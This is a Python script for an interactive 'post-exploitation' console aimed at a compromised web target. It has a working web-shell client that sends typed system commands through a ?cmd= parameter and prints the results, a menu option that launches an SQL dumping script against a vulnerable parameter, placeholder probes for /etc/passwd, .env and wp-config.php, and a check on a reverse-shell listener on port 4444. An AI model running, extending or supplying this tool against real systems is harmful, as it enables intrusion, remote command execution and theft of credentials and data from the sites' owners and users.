import sys
import os
import subprocess

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def access_console(target_url, access_type="webshell"):
    while True:
        clear_screen()
        print("=" * 60)
        print(f"[*] ACCESS GAINED CONSOLE | Target: {target_url}")
        print(f"[*] Session Type: {access_type.upper()}")
        print("=" * 60)
        print(" [Post-Exploitation Operations]")
        print("  1) Execute System Command (e.g., id, uname -a, whoami)")
        print("  2) Enumerate Database Tables & Records (via SQL Dumper)")
        print("  3) Harvest Configuration / Sensitive Files")
        print("  4) Verify / Keep-Alive Reverse Shell Listener")
        print("  5) Export Session Findings to Report")
        print("  6) Return to Main Framework Menu")
        print("=" * 60)
        
        choice = input("Select post-exploitation action [1-6]: ").strip()
        
        if choice == "1":
            cmd = input("Enter system command to execute: ").strip()
            if cmd:
                print(f"\n[*] Executing command on target...")
                # If it's a web shell, append command to ?cmd=
                if access_type == "webshell":
                    shell_endpoint = f"{target_url}?cmd={cmd}"
                    try:
                        import requests
                        resp = requests.get(shell_endpoint, timeout=5, verify=False)
                        print(f"\n[Output]:\n{resp.text}")
                    except Exception as e:
                        print(f"[-] Execution failed: {e}")
                else:
                    print(f"[-] Simulating local execution for: {cmd}")
            input("\nPress Enter to continue...")
            
        elif choice == "2":
            print("\n[*] Launching deeper database table enumeration...")
            param = input("Enter vulnerable parameter name (default 'cat'): ").strip() or "cat"
            subprocess.run(["python", "sql_dumper.py", target_url, "-p", param])
            input("\nPress Enter to continue...")
            
        elif choice == "3":
            print("\n[*] Searching for common configuration files...")
            common_files = ["/etc/passwd", "/etc/hosts", "config.php", ".env", "wp-config.php"]
            for cf in common_files:
                print(f"    [+] Probing target for: {cf}")
            input("\nPress Enter to continue...")
            
        elif choice == "4":
            print("\n[*] Checking listener status on port 4444...")
            os.system("netstat -an | grep 4444 || ss -tulpn | grep 4444")
            input("\nPress Enter to continue...")
            
        elif choice == "5":
            print("\n[*] Exporting session artifacts to 'access_report.txt'...")
            with open("access_report.txt", "w") as f:
                f.write(f"Target: {target_url}\nSession Type: {access_type}\nStatus: Active\n")
            print("[+] Report saved successfully.")
            input("\nPress Enter to continue...")
            
        elif choice == "6":
            print("\n[*] Exiting access console...")
            break
        else:
            print("[-] Invalid choice. Please select between 1 and 6.")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
    atype = sys.argv[2] if len(sys.argv) > 2 else "webshell"
    access_console(target, atype)
